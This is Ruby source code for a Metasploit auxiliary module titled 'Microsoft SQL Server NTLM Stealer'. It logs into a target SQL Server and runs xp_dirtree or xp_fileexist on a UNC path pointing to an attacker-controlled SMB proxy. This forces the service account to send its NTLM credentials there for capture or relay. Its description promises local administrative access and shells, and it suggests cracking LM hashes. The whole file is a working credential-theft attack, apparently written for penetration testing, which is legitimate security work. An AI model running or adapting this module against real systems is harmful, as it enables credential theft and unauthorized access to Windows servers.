require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::MSSQL
	include Msf::Auxiliary::Scanner
	include Rex::Text

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft SQL Server NTLM Stealer',
			'Description'    => %q{
				This module can be used to help capture or relay the LM/NTLM
				credentials of the account running the remote SQL Server service.
				The module will use the supplied credentials to connect to the
				target SQL Server instance and execute the native "xp_dirtree" or
				"xp_fileexist" stored procedure.   The stored procedures will then
				force the service account to authenticate to the system defined in
				the SMBProxy option. In order for the attack to be successful, the
				SMB capture or relay module must be running on the system defined
				as the SMBProxy.  The database account used to connect to the
				database should only require the "PUBLIC" role to execute.
				Successful execution of this attack usually results in local
				administrative access to the Windows system.  Specifically, this
				works great for relaying credentials between two SQL Servers using
				a shared service account to get shells.  However, if the relay fails,
				then the LM hash can be reversed using the Halflm rainbow tables and
				john the ripper. Thanks to "Sh2kerr" who wrote the ora_ntlm_stealer
				for the inspiration.
			},
			'Author'         => [ 'nullbind <scott.sutherland[at]netspi.com>' ],
			'License'        => MSF_LICENSE,
			'Platform'      => [ 'Windows' ],
			'References'     => [[ 'URL', 'http://en.wikipedia.org/wiki/SMBRelay' ]],
		))

		register_options(
			[
				OptString.new('SMBPROXY', [ true, 'IP of SMB proxy or sniffer.', '0.0.0.0']),
			], self.class)
	end

	def run_host(ip)

		# Reminder
		print_status("DONT FORGET to run a SMB capture or relay module!")

		# Set default result (fail)
		result = 0

		# Call auth_force method to execute "xp_dirtree"
		result = force_auth("xp_dirtree",datastore['SMBPROXY'],rhost,rport)

		# Call auth_force method to execute "xp_fileexist" if "xp_dirtree" fails
		if result == 0 then
			force_auth("xp_fileexist",datastore['SMBPROXY'],rhost,rport)
		end
	end


	# --------------------------------------------
	# Method to force sql server to authenticate
	# --------------------------------------------
	def force_auth(sprocedure,smbproxy,vic,vicport)

		print_status("Forcing SQL Server at #{vic} to auth to #{smbproxy} via #{sprocedure}...")

		# Generate random file name
		rand_filename = Rex::Text.rand_text_alpha(8, bad='')

		# Setup query
		sql = "#{sprocedure} '\\\\#{smbproxy}\\#{rand_filename}'"

		# Execute query
		begin
			result = mssql_query(sql, false) if mssql_login_datastore
			column_data = result[:rows]
			print_good("Successfully executed #{sprocedure} on #{rhost}")
			print_good("Go check your SMB relay or capture module for goodies!")
			return 1
		rescue
			print_error("#{sprocedure} failed to initiate authentication to smbproxy.")
			return 0
		end
	end

end
